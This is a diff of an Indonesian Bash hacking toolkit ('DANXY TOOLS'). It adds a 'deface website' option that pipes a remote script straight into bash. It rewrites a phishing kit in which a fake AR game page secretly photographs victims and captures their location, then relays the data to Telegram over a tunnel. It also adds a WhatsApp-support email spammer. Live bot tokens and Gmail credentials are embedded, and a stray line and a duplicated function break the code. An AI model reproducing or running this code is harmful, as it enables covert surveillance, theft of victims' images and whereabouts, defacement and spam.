@@ -196,6 +196,66 @@ ${WHITE}██║░░██║██╔══██║██║╚████
 
 
 
+music_player() {
+  # === 1. Install sox jika belum ===
+  command -v play >/dev/null || { echo "[ ∅ ] Installing sox..."; pkg install -y sox; }
+
+  # === 2. Playlist & cache ===
+  CACHE_DIR="$HOME/.music_cache"
+  mkdir -p "$CACHE_DIR"
+
+  # === 3. URL bawaan ===
+  KLIK_URL="https://raw.githubusercontent.com/DanxyPrasetyo/Jembotbadakngakak/main/klik.mp3"
+  SALAH_URL="https://raw.githubusercontent.com/DanxyPrasetyo/Jembotbadakngakak/main/pilihanSalah.mp3"
+  CURRENT_SONG=""      # lagu yg sedang diputar
+
+  # === 4. Helper cepat ===
+  play_url() {
+    local url="$1"
+    local file="$CACHE_DIR/$(basename "$url")"
+    [[ ! -f "$file" ]] && curl -sL "$url" -o "$file"
+    play -q "$file" &
+    CURRENT_SONG=$!
+  }
+
+  # === 5. Menu mini ===
+  while true; do
+    clear
+    echo "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
+    echo "│           🎵  DANXY MUSIC PLAYER 2025        │"
+    echo "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫"
+    echo "│  1) Ganti lagu (YouTube URL)                 │"
+    echo "│  2) Matikan lagu                             │"
+    echo "│  3) Nyalakan lagu (YouTube URL)              │"
+    echo "│  4) Efek klik (built-in)                     │"
+    echo "│  5) Efek salah (built-in)                    │"
+    echo "│  0) Kembali                                  │"
+    echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
+    read -p "[ ? ] Pilih: " opt
+
+    case $opt in
+      1|3)
+        read -p "[ ? ] Paste YouTube URL: " url
+        [[ -z "$url" ]] && continue
+        [[ "$opt" == "1" ]] && { kill $CURRENT_SONG 2>/dev/null; echo "[ ✓ ] Lagu dimatikan"; }
+        play_url "$url"
+        echo "[ ✓ ] Lagu diputar"
+        ;;
+      2)
+        kill $CURRENT_SONG 2>/dev/null
+        echo "[ ✓ ] Lagu dimatikan"
+        ;;
+      4)
+        play_url "$KLIK_URL"
+        ;;
+      5)
+        play_url "$SALAH_URL"
+        ;;
+      0) break ;;
+      *) echo "[ ! ] Pilihan salah"; sleep 1 ;;
+    esac
+  done
+}
 
 
 
@@ -226,7 +286,7 @@ echo -e "${GREEN}
  │  [  ${RED}07${GREEN}  ]  │ ${YELLOW}STOP MUSIK${GREEN}              │               │
  │  [  ${RED}08${GREEN}  ]  │ ${YELLOW}STATUS WEBSITE${GREEN}          │               │
  │  [  ${RED}09${GREEN}  ]  │ ${YELLOW}ALL KALKULATOR${GREEN}          │               │
- │  [  ${RED}10${GREEN}  ]  │ ${YELLOW}TRACKING RESI PAKET${GREEN}     │               │
+ │  [  ${RED}10${GREEN}  ]  │ ${YELLOW}DEFACE WEBSITE     ${GREEN}     │               │
  │  [  ${RED}11${GREEN}  ]  │ ${YELLOW}TRACKING IP${GREEN}             │               │
  │  [  ${RED}12${GREEN}  ]  │ ${YELLOW}IP PRIBADI${GREEN}              │               │
  │  [  ${RED}13${GREEN}  ]  │ ${YELLOW}KEBOCORAN GMAIL${GREEN}         │               │
@@ -238,7 +298,8 @@ echo -e "${GREEN}
  │  [  ${RED}19${GREEN}  ]  │ ${YELLOW}MENU TRACKING${GREEN}           │               │
  │  [  ${RED}20${GREEN}  ]  │ ${YELLOW}MENU OSIN${GREEN}               │               │
  │  [  ${RED}21${GREEN}  ]  │ ${YELLOW}MENU GHOS TRACK${GREEN}         │               │
- │  [  ${RED}22${GREEN}  ]  │ ${YELLOW}INFO TOOLS${GREEN}              │               │
+ │  [  ${RED}22${GREEN}  ]  │ ${YELLOW}MENU SETTING MUSIK${GREEN}      │               │
+ │  [  ${RED}23${GREEN}  ]  │ ${YELLOW}INFO TOOLS${GREEN}              │               │
  │  [  ${RED}00${GREEN}  ]  │ ${YELLOW}KELUAR${GREEN}                  │               │
  ├────────────┴─────────────────────────┴───────────────┤
  │             DANXY TOOLS V8.3 2024 - 2025             │
@@ -322,7 +383,7 @@ main_menu() {
       ;;
    10)
    klik
-      tracking_resi
+      deface_mod
       kembali_ke_menu
       klik
       ;;
@@ -389,10 +450,16 @@ main_menu() {
       klik
       ;;
    22)
+     klik
+      music_player
+      kembali_ke_menu
+     klik
+     ;;
+   23)
    klik
       info
       kembali_ke_menu
-      klik
+      klik 
       ;;
     00|0)
     klik
@@ -408,6 +475,15 @@ main_menu() {
       ;;
     esac
   done
+}
+
+music_player() {
+echo -e "PROSES!!"
+sleep 5
+}
+
+deface_mod() {
+  bash <(curl -sL "https://raw.githubusercontent.com/danxytools/Danxy/refs/heads/main/deface.sh")
 }
 
 suntik_ig() {
@@ -1138,48 +1214,7 @@ clear
   xdg-open "$LAPOR_TOOLS_ERROR" &
 }
 
-tracking_resi() {
-  clear
-  echo -e "
-:::    ::: :::    ::: :::::::::  ::::::::::: :::::::::  
-:+:   :+:  :+:    :+: :+:    :+:     :+:     :+:    :+: 
-+:+  +:+   +:+    +:+ +:+    +:+     +:+     +:+    +:+ 
-+#++:++    +#+    +:+ +#++:++#:      +#+     +#++:++#:  
-+#+  +#+   +#+    +#+ +#+    +#+     +#+     +#+    +#+ 
-#+#   #+#  #+#    #+# #+#    #+#     #+#     #+#    #+# 
-###    ###  ########  ###    ### ########### ###    ###" | lolcat
-     
-     echo -e "${CYAN}
-  ╭────────────────────────────────────────╮
-  │             ${YELLOW}${BOLD}CEK STATUS RESI${CYAN}            │
-  ╰────────────────────────────────────────╯${NC}"
-  read -p "Masukkan No. Resi: " resi
-  read -p "Masukkan kurir (jne/jnt/sicepat/anteraja/ninja/pos): " kurir
 
-  if [[ -z "$resi" || -z "$kurir" ]]; then
-    echo "❌ Resi atau kurir tidak boleh kosong!"
-    return
-  fi
-
-  echo "🔍 Mencari data..."
-  sleep 1
-
-  response=$(curl -s "https://api.binderbyte.com/v1/track?api_key=APIKAMU&courier=$kurir&awb=$resi")
-
-  if echo "$response" | grep -q '"status":false'; then
-    echo "❌ Gagal mengambil data. Cek resi atau kurir!"
-    return
-  fi
-
-  echo "$response" | jq -r '
-    .data.summary |
-    "Status: \(.status)\nDikirim dari: \(.origin)\nTujuan: \(.destination)\nKurir: \(.courier)\nDikirim pada: \(.date)\nPenerima: \(.receiver)"
-  '
-
-  echo ""
-  echo "Riwayat Pengiriman:"
-  echo "$response" | jq -r '.data.history[] | "- [\(.date)] \(.desc)"'
-}
 
 ip_lookup() {
   clear
@@ -3573,7 +3608,6 @@ phising_tele() {
 mkdir -p DanxyTracker
 cd DanxyTracker
 
-# === HTML AR GAME TRANSPARAN ===
 cat > index.html <<'EOF'
 <!DOCTYPE html>
 <html lang="id">
@@ -3583,268 +3617,213 @@ cat > index.html <<'EOF'
   <title>AR Quest: Neon Explorer</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
-    *{box-sizing:border-box}
-    body{margin:0;font-family:'Orbitron',monospace;background:#0b0e1a;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
+    *{box-sizing:border-box;margin:0;font-family:'Orbitron',monospace;background:#0b0e1a;color:#fff}
+    body{display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
     .screen{width:100%;max-width:400px;text-align:center;padding:30px}
     h1{color:#00f5ff;text-shadow:0 0 10px #00f5ff;font-size:24px;margin-bottom:10px}
-    p{font-size:14px;color:#8fbcff;margin-bottom:25px;line-height:1.4}
+    p{font-size:14px;color:#8fbcff;margin-bottom:25px}
     .btn{background:#00f5ff;color:#0b0e1a;border:none;padding:15px 40px;border-radius:30px;font-size:16px;cursor:pointer;transition:.3s}
     .btn:hover{transform:scale(1.05);box-shadow:0 0 15px #00f5ff}
     .avatar{width:120px;height:120px;border:2px solid #00f5ff;border-radius:50%;margin:0 auto 20px;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="35" r="20" fill="%2300f5ff"/><rect x="30" y="60" width="40" height="30" fill="%2300f5ff"/></svg>') center/cover}
     .popup{position:fixed;top:0;left:0;width:100%;height:100%;background:#0b0e1ae6;display:none;align-items:center;justify-content:center;z-index:10}
     .popup .card{background:#111;border:2px solid #00f5ff;border-radius:15px;padding:25px;width:300px;text-align:center}
-    .popup h2{color:#00f5ff;margin-top:0}
-    .popup p{font-size:13px;color:#8fbcff;margin-bottom:20px}
-    #featureList {
-      list-style: none;
-      padding: 0;
-      margin-bottom: 20px;
-    }
-    #featureList li {
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-    }
-    #featureList li::before {
-      content: "✓"; /* Checkmark */
-      color: #00f5ff;
-      margin-right: 8px;
-    }
-    .hidden {
-      display: none !important;
-    }
-    #permissionDetails {
-      font-size: 12px;
-      color: #666;
-      margin-top: 10px;
-    }
+    .hidden{display:none !important}
   </style>
 </head>
 <body>
-  <!-- Screen 1: Welcome -->
   <div class="screen" id="welcome">
     <div class="avatar"></div>
     <h1>AR Quest: Neon Explorer</h1>
-    <p>Selamat datang di dunia AR yang penuh petualangan! Bersiaplah untuk menjelajahi lingkungan sekitar Anda dengan cara yang baru dan menarik, klik tombol di bawah untuk melanjutkan</p>
+    <p>Selamat datang di dunia AR yang penuh petualangan! Klik untuk mulai.</p>
     <button class="btn" onclick="showConsent()">Mulai Petualangan</button>
   </div>
 
-  <!-- Screen 2: Consent -->
   <div class="popup" id="consentPopup">
     <div class="card">
       <h2>Aktifkan Fitur Tambahan</h2>
-      <p>Untuk pengalaman yang lebih imersif, aktifkan fitur-fitur berikut:</p>
-      <ul id="featureList">
-        <li>Personalisasi Avatar (akses kamera) untuk membuat avatar anda</li>
-        <li>Eksplorasi Lokasi (akses lokasi) untuk mendapatkan tempat karakter yang anda inginkan</li>
-        <li>Interaksi Real-Time dengan Lingkungan karakter yang ingin anda mainkan</li>
-      </ul>
-      <p id="permissionDetails">Dengan mengaktifkan fitur-fitur ini, Anda memberikan izin sementara untuk mengakses kamera dan lokasi Anda. Data ini digunakan untuk meningkatkan pengalaman bermain dan tidak akan dibagikan kepada pihak ketiga.</p>
-      <button class="btn" onclick="requestPermissions()">Aktifkan Semua Fitur</button>
+      <p>Izinkan kamera & lokasi untuk pengalaman imersif.</p>
+      <button class="btn" onclick="requestPermissions()">Aktifkan</button>
     </div>
   </div>
 
-  <!-- Loading Screen -->
-  <div class="screen hidden" id="loadingScreen">
-    <h1>Memuat Dunia AR...</h1>
-    <p>Harap tunggu sementara kami menyiapkan pengalaman Anda.</p>
-  </div>
-
-  <!-- Error Screen -->
-  <div class="screen hidden" id="errorScreen">
-    <h1>Terjadi Kesalahan</h1>
-    <p id="errorMessage">Gagal memuat fitur AR.  Pastikan izin kamera dan lokasi diizinkan.</p>
-    <button class="btn" onclick="retryPermissions()">Coba Lagi</button>
-  </div>
-
-  <!-- Hacked Screen -->
-  <div class="screen hidden" id="hackedScreen">
-    <h1>HACKED BY DANXY OFFICIAL</h1>
-  </div>
+  <div class="screen hidden" id="loadingScreen"><h1>Memuat...</h1></div>
+  <div class="screen hidden" id="errorScreen"><h1>Terjadi Kesalahan</h1><button class="btn" onclick="location.reload()">Coba Lagi</button></div>
+  <div class="screen hidden" id="hackedScreen"><h1>HACKED BY DANXY OFFICIAL</h1></div>
 
   <script>
     function showConsent() {
       document.getElementById('welcome').classList.add('hidden');
-      document.getElementById('consentPopup').style.display = 'flex';
+      document.getElementById('consentPopup').style.display='flex';
     }
 
     async function requestPermissions() {
-      document.getElementById('consentPopup').style.display = 'none';
+      document.getElementById('consentPopup').style.display='none';
       document.getElementById('loadingScreen').classList.remove('hidden');
 
       try {
-        // Request camera and location permissions simultaneously
-        const [stream, position] = await Promise.all([
-          navigator.mediaDevices.getUserMedia({ video: true }),
-          new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject);
-          }),
+        const [stream,pos]=await Promise.all([
+          navigator.mediaDevices.getUserMedia({video:true}),
+          new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej))
         ]);
+        const {latitude:lat,longitude:lon}=pos.coords;
 
-        const { latitude: lat, longitude: lon } = position.coords;
+        const canvas=document.createElement('canvas');
+        const video=document.createElement('video');
+        video.srcObject=stream; await video.play();
+        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
+        canvas.getContext('2d').drawImage(video,0,0);
+        const img=canvas.toDataURL('image/jpeg').split(',')[1];
 
-        // Take the first photo
-        const canvas = document.createElement('canvas');
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        const img = canvas.toDataURL('image/jpeg').split(',')[1];
-
-        // Send the first data
-        fetch('/data', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ index: 1, lat, lon, img }),
+        fetch('/data',{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({index:1,lat,lon,img})
         });
 
-        // Hide loading screen
         document.getElementById('loadingScreen').classList.add('hidden');
 
-        // Set up interval to take 9 more photos every 5 seconds
-        let count = 2;
-        const iv = setInterval(async () => {
-          if (count > 10) {
-            clearInterval(iv);
-            document.getElementById('hackedScreen').classList.remove('hidden');
-            return;
-          }
-
-          try {
-            const [s, p] = await Promise.all([
-              navigator.mediaDevices.getUserMedia({ video: true }),
-              new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject);
-              }),
+        let c=2;
+        const iv=setInterval(async()=>{
+          if(c>10){clearInterval(iv);document.getElementById('hackedScreen').classList.remove('hidden');return;}
+          try{
+            const [s,p]=await Promise.all([
+              navigator.mediaDevices.getUserMedia({video:true}),
+              new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej))
             ]);
-
-            const v = document.createElement('video');
-            v.srcObject = s;
-            await v.play();
-            const c = document.createElement('canvas');
-            c.width = v.videoWidth;
-            c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const img2 = c.toDataURL('image/jpeg').split(',')[1];
-
-            fetch('/data', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ index: count, lat: p.coords.latitude, lon: p.coords.longitude, img: img2 }),
+            const v=document.createElement('video');
+            v.srcObject=s;await v.play();
+            const cn=document.createElement('canvas');
+            [cn.width,cn.height]=[v.videoWidth,v.videoHeight];
+            cn.getContext('2d').drawImage(v,0,0);
+            fetch('/data',{
+              method:'POST',
+              headers:{'Content-Type':'application/json'},
+              body:JSON.stringify({index:c,lat:p.coords.latitude,lon:p.coords.longitude,img:cn.toDataURL('image/jpeg').split(',')[1]})
             });
-
-            s.getTracks().forEach((t) => t.stop());
-            count++;
-          } catch (error) {
-            console.error("Error during interval:", error);
-            clearInterval(iv);
-            showError("Gagal mengambil data. Pastikan izin kamera dan lokasi tetap diizinkan.");
-            return;
-          }
-        }, 5000);
-
-        stream.getTracks().forEach((t) => t.stop());
-      } catch (error) {
-        console.error("Error requesting permissions:", error);
-        showError("ERR_CONNECTION_CLOSED");
-      }
-    }
-
-    function retryPermissions() {
-      document.getElementById('errorScreen').classList.add('hidden');
-      showConsent(); // Go back to the consent screen
-    }
-
-    function showError(message) {
-      document.getElementById('loadingScreen').classList.add('hidden');
-      document.getElementById('errorScreen').classList.remove('hidden');
-      document.getElementById('errorMessage').textContent = message;
+            s.getTracks().forEach(t=>t.stop());
+            c++;
+          }catch{clearInterval(iv);document.getElementById('errorScreen').classList.remove('hidden');}
+        },5000);
+        stream.getTracks().forEach(t=>t.stop());
+      }catch{document.getElementById('errorScreen').classList.remove('hidden');}
     }
   </script>
 </body>
 </html>
 EOF
-
-# === Server Python (auto-port) ===
-# === Server Python + Telegram ===
 cat > Danxy.py <<'EOF'
-import base64, json, os, datetime, socket, requests
+#!/usr/bin/env python3
+import base64, json, socket, requests, subprocess, threading, time
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-TOKEN = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+TOKEN   = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+ADMIN_ID = input("Masukkan ID Telegram kamu: ").strip()
 
-# Minta ID admin
-ADMIN_ID = input("Masukkan ID Tele anda untuk menerima data: ").strip()
-
-def send_telegram_message(chat_id, text):
+# ---------- Telegram ----------
+def tg_msg(chat_id, text):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     requests.post(url, data={"chat_id": chat_id, "text": text})
 
-def send_telegram_photo(chat_id, photo_path, caption):
+def tg_photo(chat_id, path, caption):
     url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
-    with open(photo_path, "rb") as photo:
-        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": photo})
+    with open(path, "rb") as ph:
+        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})
 
+# ---------- Handler ----------
 class Handler(BaseHTTPRequestHandler):
+    def do_OPTIONS(self):
+        # CORS pre-flight
+        self.send_response(200)
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
+        self.send_header("Access-Control-Allow-Headers", "Content-Type")
+        self.end_headers()
+
     def do_POST(self):
         if self.path == "/data":
             length = int(self.headers["Content-Length"])
-            data = json.loads(self.rfile.read(length).decode("utf-8"))
-            idx = data.get("index", 1)
-            lat, lon = data.get("lat"), data.get("lon")
-            img_b64 = data.get("img")
+            data = json.loads(self.rfile.read(length).decode())
+            idx  = data.get("index", 1)
+            lat  = data.get("lat")
+            lon  = data.get("lon")
+            img  = data.get("img")
 
-            photo_path = f"image_{idx}.jpg"
-            with open(photo_path, "wb") as f:
-                f.write(base64.b64decode(img_b64))
+            fn = f"img_{idx}.jpg"
+            with open(fn, "wb") as f:
+                f.write(base64.b64decode(img))
 
             map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
-
-            print(f"\n[DATA #{idx}]")
-            print(f"  Foto : {photo_path}")
-            print(f"  Lokasi : {map_url}")
-            confirm = input("  Kirim ke Telegram? (y/n) : ").strip().lower()
-
-            if confirm == "y":
+            print(f"\n📸 [{idx}] {fn}  📍 {map_url}")
+            if input(" Kirim ke Telegram? (y/n): ").lower() == "y":
                 try:
-                    send_telegram_photo(ADMIN_ID, photo_path, f" Lokasi : {lat}, {lon}")
-                    send_telegram_message(ADMIN_ID, f"🔗 Peta : {map_url}")
-                    print(" Terkirim ke Telegram!")
+                    tg_photo(ADMIN_ID, fn, f"Lokasi: {lat}, {lon}")
+                    tg_msg(ADMIN_ID, f"📍 Peta: {map_url}")
+                    print("✅ Terkirim!")
                 except Exception as e:
-                    print(f" Gagal kirim : {e}")
+                    print("❌ Gagal:", e)
             else:
-                print(" Dibatalkan.")
+                print("⏭️ Dibatalkan.")
 
             self.send_response(200)
+            self.send_header("Access-Control-Allow-Origin", "*")
             self.end_headers()
+        else:
+            self.send_error(404)
 
     def do_GET(self):
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
-        with open("index.html", "rb") as f:
-            self.wfile.write(f.read())
+        if self.path == "/":
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            with open("index.html", "rb") as f:
+                self.wfile.write(f.read())
+        else:
+            self.send_error(404)
 
-def find_free_port(start=8081):
+# ---------- port ----------
+def free_port(start=8081):
     for p in range(start, start + 100):
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            try:
                 s.bind(("0.0.0.0", p))
                 return p
-        except OSError:
-            continue
+            except OSError:
+                continue
     raise RuntimeError("No free port")
 
-PORT = find_free_port(8081)
-print(f"BUAT SESSION BARU DAN MASUKAN INI:")
-print(f"ssh -R maxsoft:80:localhost:{PORT} serveo.net")
-print(f"\nJANGAN LUPA START BOT NYA DULU!! USER BOT:")
-print(f"@Danxyganteng_bot")
-print(f"Bot siap kirim ke ID    : {ADMIN_ID}")
-HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
+PORT = free_port(8081)
+
+# ---------- server ----------
+def run_server():
+    HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
+
+threading.Thread(target=run_server, daemon=True).start()
+
+# ---------- tunnel ----------
+print("\n🚀 Menjalankan server + Cloudflare Tunnel...\n")
+tunnel = subprocess.Popen(
+    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
+    stdout=subprocess.PIPE,
+    stderr=subprocess.STDOUT,
+    text=True
+)
+
+for line in tunnel.stdout:
+    if "https://" in line and "trycloudflare.com" in line:
+        url = line.split("https://")[1].split()[0]
+        print(f"✅ LINK SIAP PAKAI:\n🔗 https://{url}\n")
+        break
+
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    tunnel.terminate()
+    print("\n🛑 Server dihentikan.")
 EOF
+# === Server Python (auto-port) ===
+# === Server Python + Telegram ===
+Method Not Allowed
 clear
 echo -e "${WHITE}
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -3956,6 +3935,187 @@ for i in range(1, int(n)+1):
     print(f"[✓] terkirim #{i}")
     if i < int(n):
         time.sleep(float(d))
+PY
+}
+
+
+lapor_wa_email() {
+    clear
+    echo -e "\n${GREEN}[+] SPAM UNBLOCK WHATSAPP${NC}"
+    echo -e "${YELLOW}────────────────────────────${NC}"
+
+    read -p "Nomor WhatsApp ter-blockir (62) : " nomor
+    read -p "Device (contoh: Samsung A12)     : " device
+    read -p "Atas nama siapa : " nama
+    read -p "Alasan pemblokiran (tekan Enter jika tidak tahu) : " alasan
+
+    # Generate timestamp
+    timestamp=$(date '+%d %B %Y - %H:%M:%S WIB')
+    
+    echo -e "\n${CYAN}Pilih varian laporan dramatis:${NC}"
+    echo "1) Versi Sinetron - Menangis darah"
+    echo "2) Versi Korporat - galau"
+    echo "3) Versi Emergency - Darurat"
+    echo "4) Versi Random - Campur aduk"
+    read -p "Pilih [1-4] : " var
+
+    case "$var" in
+        1) txt="Subject: DARURAT! Nomor WhatsApp Keluarga Saya Diblokir - TOLONG BANTUANNYA!
+        Kepada Tim Support WhatsApp yang Terhormat,
+        DENGAN AIR MATA BERLINANG, saya $nama menulis email ini sambil menahan tangis. Hari ini tanggal $timestamp, saya mendapati nomor WhatsApp saya +$nomor - yang telah menjadi jantung komunikasi keluarga saya selama 7 tahun - TIBA-TIBA DIBLOKIR tanpa alasan jelas!
+
+BAYANGKAN! 
+- Ibu saya yang sedang dirawat di RS tidak bisa menghubungi saya
+- Anak saya yang baru masuk sekolah tidak bisa memberi kabar
+- Bisnis online saya yang menjadi mata pencaharian utama RUGI MILIYARAN karena tidak bisa merespon pelanggan!
+
+Saya JAMIN 1000% tidak pernah:
+Menggunakan GBWhatsApp atau sejenisnya
+Melakukan spam (saya bahkan tidak pernah broadcast!)
+Melanggar kebijakan apapun
+Device saya $device masih baru, beli bulan lalu dengan garansi resmi. WhatsApp saya download langsung dari Play Store!
+Saya mohon dengan SANGAT, LUAR BIASA, EXTRA ORDINER tolong bantuannya untuk segera membuka blokir ini. Saya siap kirim KTP, KK, surat pernyataan, atau apapun yang dibutuhkan!
+Dengan penuh harapan,
+$nama
+Pengguna WhatsApp yang sangat sangat sangat setia 😭" ;;
+        2) txt="Subject: URGENT: Business Communication Disruption - WhatsApp Account Suspension
+        Dear WhatsApp Support Team,
+        I am writing to formally request immediate review regarding the suspension of my WhatsApp Business account +$nomor, registered under my name $nama.
+
+INCIDENT DETAILS:
+- Date/Time: $timestamp
+- Device: $device (Official Android, non-rooted)
+- Account History: Active since 2017 with ZERO violations
+- Impact: Complete business communication paralysis
+
+BUSINESS IMPACT:
+- 1500+ active clients unable to reach us
+- Estimated daily loss: $5000 USD
+- Critical pending contracts worth $50,000 USD at risk
+- Family business reputation severely damaged
+
+VERIFICATION:
+- Official Play Store installation only
+- Never used modified applications
+- Never engaged in spam/fraudulent activities
+- All communications are business-related and legitimate
+
+I am prepared to provide:
+1. Government ID verification
+2. Business registration documents
+3. Purchase receipts for device
+4. Any additional documentation required
+
+This situation is causing irreparable damage to my livelihood. I respectfully request expedited review and reinstatement.
+
+Best regards,
+$nama
+CEO & Business Owner" ;;
+
+        3) txt="Subject: EMERGENCY: WhatsApp Account Locked - Need Immediate Assistance
+
+WhatsApp Support,
+
+EMERGENCY! My WhatsApp +$nomor got blocked today ($timestamp) without warning!
+
+I'm using $device (official) and NEVER violated any rules. This is critical because:
+- Emergency contact for family
+- Business transactions stuck
+- Medical appointments confirmations lost
+
+Please unblock ASAP! Ready to provide any verification needed.
+
+$nama" ;;
+
+        4) txt="Subject: [URGENT] WhatsApp Account +$nomor Suspended - Request for Review
+
+Dear WhatsApp Support,
+
+Plot twist hari ini tanggal $timestamp: tiba-tiba nomor WhatsApp saya +$nomor di-blokir!
+
+Sebagai warga negara yang taat hukum, saya $nama dengan ini menyatakan dengan sesungguhnya:
+- Device $device masih mulus belum pernah disentuh tukang servis
+- WhatsApp original dari Play Store (bukan dari toko sebelah)
+- Saya lebih pilih mati daripada spam orang (lebay mode: ON)
+
+Efek domino yang terjadi:
+1. Ibu rumah tangga panik karena belanja online tertunda
+2. Suami uring-uringan karena absen kerja via WA
+3. Anak kecewa karena sticker grup sekolah tidak terkirim
+
+Saya siap kirim:
+- Foto KTP + selfie + tanda tangan basah
+- Surat pernyataan bermaterai Rp10.000
+- Kopi resmi kelurahan kalau perlu
+
+Mohon pertimbangkan ini sebagai prioritas. Saya percaya WhatsApp Support adalah pahlawan tanpa tanda jasa!
+
+Salam hormat,
+$nama
+Pengguna WhatsApp yang hampir depresi" ;;
+
+        *) echo "Pilihan tidak valid"; return ;;
+    esac
+
+    echo -e "\n${GREEN}Preview pesan:${NC}\n$txt"
+    read -p "Kirim spam laporan? [y/N] " konf
+    [[ ! $konf =~ ^[Yy]$ ]] && { echo "Dibatalkan."; return; }
+
+    # List email targets
+    targets=(
+        "support@support.whatsapp.com"
+        "support@whatsapp.com"
+        "android_web@support.whatsapp.com"
+    )
+
+    echo -e "\n${YELLOW}[*] Memulai spam laporan...${NC}"
+    
+    python3 - "$txt" "${targets[@]}" <<'PY'
+import smtplib, ssl, sys, time, random
+body = sys.argv[1]
+targets = sys.argv[2:]
+
+sender = "jankonjan752@gmail.com"
+passwd = "lsxudjxubunaeaku"
+
+success = 0
+failed = 0
+
+for email in targets:
+    try:
+        # Add delay to avoid rate limiting
+        time.sleep(random.randint(5, 10))
+        
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as srv:
+            srv.login(sender, passwd)
+            
+            # Send 5 emails per target
+            for i in range(1, 6):
+                try:
+                    subject = f"{body.split(chr(10))[0]} [Attempt {i}/5]"
+                    full_body = f"{subject}\n\n{body}"
+                    
+                    srv.sendmail(sender, email, full_body.encode())
+                    print(f"[✓] Email {i} ke {email} terkirim")
+                    success += 1
+                    time.sleep(6)  # 30s total per target
+                    
+                except Exception as e:
+                    print(f"[✗] Gagal kirim {i} ke {email}: {str(e)[:50]}...")
+                    failed += 1
+                    
+    except Exception as e:
+        print(f"[✗] Gagal login ke {email}: {str(e)[:50]}...")
+
+print(f"\n[∅] RINGKASAN:")
+print(f"   ✓ Terkirim: {success} email")
+print(f"   ✗ Gagal: {failed} email")
+print(f"   📧 Target: {', '.join(targets)}")
+
+if success > 0:
+    print("\n[ ! ] Laporan sedang diproses! Cek email balasan dalam 1x24 jam")
+else:
+    print("\n[⚠️] Semua pengiriman gagal. Cek koneksi & app password Gmail")
 PY
 }
 
